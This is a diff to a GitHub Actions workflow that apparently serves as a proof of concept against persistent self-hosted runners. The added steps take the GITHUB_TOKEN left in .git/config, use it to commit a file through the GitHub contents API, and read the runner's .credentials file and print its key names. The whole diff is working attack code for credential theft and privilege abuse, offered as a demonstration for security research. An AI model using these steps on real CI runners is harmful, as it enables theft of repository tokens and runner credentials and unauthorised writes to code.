@@ -56,6 +56,11 @@ jobs:
           $tok = ($plain -split ':', 2)[1]
           $r = Invoke-RestMethod -Uri 'https://api.github.com/repos/madhanalagarsamy/selfhosted-runner-poc' -Headers @{ Authorization = "Bearer $tok"; 'User-Agent' = 'poc' }
           Write-Host "E6_TOKEN_FROM_GITCONFIG=ok perms.push=$($r.permissions.push) perms.admin=$($r.permissions.admin)"
+          $body = @{ message = "e6 proof: write using token extracted from .git/config (run ${{ github.run_id }})"; content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("# E6 proof`n`nWrite performed with GITHUB_TOKEN recovered from the checkout credential persisted in .git/config on a persistent self-hosted runner.")) } | ConvertTo-Json
+          try {
+            $w = Invoke-RestMethod -Method Put -Uri "https://api.github.com/repos/madhanalagarsamy/selfhosted-runner-poc/contents/e6-proof-${{ github.run_id }}.md" -Headers @{ Authorization = "Bearer $tok"; 'User-Agent' = 'poc' } -Body $body -ContentType 'application/json'
+            Write-Host "E6_WRITE_OK commit=$($w.commit.sha)"
+          } catch { Write-Host "E6_WRITE_FAIL status=$($_.Exception.Response.StatusCode.value__) $($_.Exception.Message)" }
 
   e2-credentials:
     needs: e1-consume
@@ -70,11 +75,15 @@ jobs:
           Write-Host "runner_dir=$rd"
           Get-ChildItem -Force $rd -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "entry: $($_.Name)" }
           $cred = Join-Path $rd '.credentials'
-          if (Test-Path $cred) {
-            Write-Host "E2_CREDENTIALS_FILE=present length=$((Get-Item $cred).Length)"
-            try { $j = Get-Content $cred -Raw | ConvertFrom-Json; Write-Host "E2_CRED_KEYS=$(($j.PSObject.Properties.Name) -join ',')" } catch { Write-Host 'E2_CRED_KEYS=unparsed' }
+          if ([System.IO.File]::Exists($cred)) {
+            try {
+              $raw = Get-Content -LiteralPath $cred -Raw -Force -ErrorAction Stop
+              Write-Host "E2_CREDENTIALS_FILE=present chars=$($raw.Length)"
+              $j = $raw | ConvertFrom-Json
+              Write-Host "E2_CRED_KEYS=$(($j.PSObject.Properties.Name) -join ',')"
+            } catch { Write-Host "E2_CREDENTIALS_READ_ERROR=$($_.Exception.Message)" }
           } else { Write-Host 'E2_CREDENTIALS_FILE=absent' }
-          if (Test-Path (Join-Path $rd '.runner')) { Write-Host 'E2_RUNNER_FILE=present' }
+          if ([System.IO.File]::Exists((Join-Path $rd '.runner'))) { Write-Host 'E2_RUNNER_FILE=present' }
           $diag = Join-Path $rd '_diag'
           if (Test-Path $diag) { Write-Host "E2_DIAG_FILES=$((Get-ChildItem $diag -File -ErrorAction SilentlyContinue).Count)" }
 
